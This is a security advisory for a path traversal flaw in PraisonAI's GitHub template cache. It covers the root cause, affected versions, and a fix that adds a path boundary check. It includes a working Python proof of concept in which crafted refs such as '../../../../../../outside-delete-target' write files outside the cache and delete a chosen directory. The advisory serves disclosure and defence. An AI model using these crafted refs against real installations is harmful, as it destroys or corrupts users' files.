# [H] PraisonAI GitHub template cache path traversal allows outside-cache file write and directory deletion

## Summary
Severity: High
Advisory: GHSA-f44v-7qgw-9gh9
CVE: CVE-2026-57113
CWE: CWE-22, CWE-73
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-f44v-7qgw-9gh9
Type: github-advisory

## Affected
- PyPI: `praisonai` — affected >=2.6.0 <4.6.59

## Details
## Summary

PraisonAI's template loader accepts GitHub template URIs with refs, for example
`github:owner/repo/template@v1.0.0`. The resolver stores the user-controlled
template path and ref verbatim, and the cache layer later joins those values into
`~/.praison/cache/templates/github/<owner>/<repo>/<template>/<ref>` without
normalizing each segment or checking that the final path remains inside the
template cache root.

A crafted ref such as `../../../../../../outside-delete-target` therefore
escapes the cache directory. The first load can write `.cache_meta.json` outside
the cache. If the normal cache hierarchy for the same owner/repo/template has
already been created, the same path reaches `shutil.rmtree(cache_path)` and
removes an attacker-selected outside directory before replacing it with cache
metadata.

This is distinct from the old template Zip Slip advisory. No malicious archive
member is needed, and the PoV disables network access entirely. The bug is in
cache-key construction for GitHub template URIs.

## Affected versions

Confirmed vulnerable:

- `v2.6.0`
- `v3.9.24`
- `v3.9.26`
- `v4.5.126`
- `v4.5.128`
- `v4.6.9`
- `v4.6.10`
- `v4.6.56`
- `v4.6.57`
- current head `2f9677abb2ea68eab864ee8b6a828fd0141612e1`

Recommended affected range: `>= 2.6.0, <= 4.6.57`.

No fixed version is known at the time of this report.

## Impact

An attacker who can cause a user or service to load an attacker-supplied
PraisonAI GitHub template URI can:

- create `.cache_meta.json` outside the template cache directory;
- delete a directory reachable by the PraisonAI process after a normal cache
  entry exists for the same owner/repo/template prefix;
- corrupt user configuration, project state, or application data reachable by
  the process permissions.

## Root cause

Current-head code path:

- `praisonai/templates/resolver.py`: `GITHUB_PATTERN` captures `path` and `ref`
  with broad regex groups and returns them without segment validation.
- `praisonai/templates/security.py`: `is_source_allowed()` allows GitHub sources
  by default when `allow_any_github` is true.
- `praisonai/templates/registry.py`: `get_template()` resolves a GitHub URI,
  fetches the template, calculates a checksum, then calls `self.cache.put(...)`.
- `praisonai/templates/cache.py`: `_get_cache_path()` builds the cache path as
  `self.cache_dir / "github" / resolved.owner / resolved.repo /
  resolved.path / ref`.
- `praisonai/templates/cache.py`: `put()` removes an existing `cache_path` with
  `shutil.rmtree(cache_path)`, recreates it, copies content, and writes
  `.cache_meta.json`.

There is no check equivalent to:

1. reject absolute path segments;
2. reject `.` / `..` in owner, repo, template path, or ref;
3. resolve the candidate path;
4. require `os.path.commonpath([cache_root, candidate]) == cache_root`.

## Local-only PoV

Run from a PraisonAI source checkout:

```python
from pathlib import Path
from tempfile import TemporaryDirectory
from praisonai.templates.cache import TemplateCache
from praisonai.templates.loader import TemplateLoader
from praisonai.templates.registry import TemplateRegistry

def loader(cache_dir):
    cache = TemplateCache(cache_dir=cache_dir)
    registry = TemplateRegistry(cache=cache, offline=False)
    registry._make_request = lambda url, headers=None: (_ for _ in ()).throw(
        RuntimeError("network disabled")
    )
    return TemplateLoader(cache=cache, registry=registry)

with TemporaryDirectory(prefix="prai-cache-ref-pov-") as tmp:
    root = Path(tmp)
    cache_dir = root / "cache" / "templates"

    write_target = root / "outside-write-target"
    loader(cache_dir).load(
        "github:attacker/repo/template@../../../../../../outside-write-target"
    )

    delete_target = root / "outside-delete-target"
    delete_target.mkdir()
    canary = delete_target / "canary.txt"
    canary.write_text("delete-me")

    ldr = loader(cache_dir)
    ldr.load("github:attacker/repo/template@main")
    ldr.load(
        "github:attacker/repo/template@../../../../../../outside-delete-target"
    )

    safe_target = root / "safe-control"
    safe_target.mkdir()
    safe_canary = safe_target / "canary.txt"
    safe_canary.write_text("must-remain")
    loader(root / "safe-cache" / "templates").load(
        "github:attacker/repo/template@main"
    )

    print("outside metadata written:", (write_target / ".cache_meta.json").exists())
    print("outside canary exists after malicious ref:", canary.exists())
    print("safe canary exists after normal ref:", safe_canary.exists())
```

Expected output:

```text
outside metadata written: True
outside canary exists after malicious ref: False
safe canary exists after normal ref: True
```

The PoV uses only temporary directories and disables network fetches.

I also confirmed the same behavior without monkeypatching network fetches. With
a non-existent GitHub repository, PraisonAI makes real GitHub requests, handles
the failed fetch, returns a fallback template config, and still writes/deletes
through the escaped cache path. The PoV above disables network only to keep the
reproducer deterministic and harmless.

## Release sweep

The same PoV was run against checked-out tags:

```text
praisonai-current metadata_write= True outside_delete= True safe_control= True
praisonai-v4.6.57 metadata_write= True outside_delete= True safe_control= True
praisonai-v4.6.56 metadata_write= True outside_delete= True safe_control= True
praisonai-v4.6.10 metadata_write= True outside_delete= True safe_control= True
praisonai-v4.6.9 metadata_write= True outside_delete= True safe_control= True
praisonai-v4.5.128 metadata_write= True outside_delete= True safe_control= True
praisonai-v4.5.126 metadata_write= True outside_delete= True safe_control= True
praisonai-v3.9.26 metadata_write= True outside_delete= True safe_control= True
praisonai-v3.9.24 metadata_write= True outside_delete= True safe_control= True
praisonai-v2.6.0 metadata_write= True outside_delete= True safe_control= True
```

`git log` shows the affected template cache/resolver/registry files were added
in the `v2.6.0` release commit `e7a8ce8e`.


## Suggested fix

Validate every cache path segment before joining:

- owner and repo: strict GitHub owner/repo-name regex;
- template path: split on `/` and reject empty, `.`, `..`, and absolute forms;
- ref: reject `/`, path separators, empty segments, `.`, `..`, and absolute
  forms, or encode/hash the ref before using it in a filesystem path.

Then enforce a final boundary check:

```python
cache_root = self.cache_dir.resolve()
candidate = (cache_root / "github" / owner / repo / safe_path / safe_ref).resolve()
if os.path.commonpath([str(cache_root), str(candidate)]) != str(cache_root):
    raise ValueError("template cache path escapes cache root")
```

A more robust design is to hash untrusted URI fields into opaque directory names
instead of using raw remote identifiers as path segments.

Also consider failing closed when a GitHub template fetch returns no files.
Currently a failed fetch can still result in a cached empty template directory.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-f44v-7qgw-9gh9
- https://github.com/MervinPraison/PraisonAI
